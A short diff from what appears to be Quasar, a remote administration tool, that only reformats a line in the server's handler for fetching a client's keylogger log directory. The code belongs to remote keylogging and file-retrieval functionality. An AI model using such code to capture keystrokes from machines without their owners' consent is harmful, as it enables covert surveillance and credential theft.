@@ -81,7 +81,7 @@ namespace Quasar.Server.Messages
         private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
         {
             _remoteKeyloggerDirectory = message.LogsDirectory;
-            client.Send(new GetDirectory {RemotePath = _remoteKeyloggerDirectory});
+            client.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
         }
 
         private string GetDownloadProgress(int allTransfers, int completedTransfers)
